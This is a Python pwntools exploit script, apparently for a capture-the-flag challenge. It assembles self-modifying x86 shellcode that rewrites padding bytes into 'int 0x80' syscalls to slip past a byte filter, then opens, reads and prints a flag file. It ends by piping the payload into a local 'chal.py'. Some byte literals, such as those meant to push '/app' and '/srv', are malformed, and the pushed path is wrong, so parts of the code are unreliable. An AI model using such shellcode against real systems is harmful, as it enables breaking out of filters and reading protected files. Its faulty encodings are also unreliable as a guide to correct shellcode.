#!/usr/bin/env python3
from pwn import *

base = 0x1337005

sc = b""

# Syscall locations
syscall1_offset = 80
syscall2_offset = 120
syscall3_offset = 160
syscall4_offset = 180

syscall1_addr = base + syscall1_offset
syscall2_addr = base + syscall2_offset
syscall3_addr = base + syscall3_offset
syscall4_addr = base + syscall4_offset

# Modify all syscall bytes
for addr in [syscall1_addr, syscall2_addr, syscall3_addr, syscall4_addr]:
    sc += b"\xb8" + p32(addr)      # mov eax, addr
    sc += b"\x80\x00\x8d"           # add byte ptr [eax], 0x8d
    sc += b"\x40"                    # inc eax
    sc += b"\x80\x00\x40"            # add byte ptr [eax], 0x40

# SYSCALL 1: open("/srv/app/flag", O_RDONLY)
# Push string in reverse: "/srv/app/flag\x00"
# "flag" = 0x67616c66
# "/app" = 0x7070612f
# "/srv" = 0x7672732f

sc += b"\x68\x66\x6c\x61\x67"  # push "flag"
sc += b"\x68\x7070\x612f"      # push "/app" + "/"
sc += b"\x68\x7672\x732f"      # push "/srv"
sc += b"\x89\xe3"               # mov ebx, esp (filename pointer)
sc += b"\xb8\x05\x00\x00\x00"  # mov eax, 5 (open)
sc += b"\xb9\x00\x00\x00\x00"  # mov ecx, 0 (O_RDONLY)
sc += b"\xba\x00\x00\x00\x00"  # mov edx, 0

curr_len = len(sc)
sc += b"\xe9" + p32((syscall1_offset - curr_len - 5) & 0xffffffff)

# Pad to syscall1
while len(sc) < syscall1_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

# SYSCALL 2: read(fd, buf, 100)
sc += b"\x89\xc3"               # mov ebx, eax (fd)
sc += b"\xb8\x03\x00\x00\x00"  # mov eax, 3 (read)
sc += b"\x89\xe1"               # mov ecx, esp (buffer)
sc += b"\xba\x64\x00\x00\x00"  # mov edx, 100

curr_len = len(sc)
sc += b"\xe9" + p32((syscall2_offset - curr_len - 5) & 0xffffffff)

# Pad to syscall2
while len(sc) < syscall2_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

# SYSCALL 3: write(1, buf, count)
sc += b"\x89\xc2"               # mov edx, eax (count from read)
sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (write)
sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1 (stdout)
# ecx already points to buffer

curr_len = len(sc)
sc += b"\xe9" + p32((syscall3_offset - curr_len - 5) & 0xffffffff)

# Pad to syscall3
while len(sc) < syscall3_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

# SYSCALL 4: exit(0)
sc += b"\xb8\x01\x00\x00\x00"  # mov eax, 1
sc += b"\xbb\x00\x00\x00\x00"  # mov ebx, 0

curr_len = len(sc)
sc += b"\xe9" + p32((syscall4_offset - curr_len - 5) & 0xffffffff)

# Pad to syscall4
while len(sc) < syscall4_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

# After exit
exit_loop_offset = len(sc)
sc += b"\xe9" + p32((syscall4_offset - exit_loop_offset - 5) & 0xffffffff)

print(f"Length: {len(sc)}")
print(f"Payload: {sc.hex()}")

# Validate
import os
result = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1').read()
if "bad" in result.lower() or "jmp must be valid" in result:
    print("\nVALIDATION FAILED:")
    print(result)
else:
    print("\nValidation passed!")
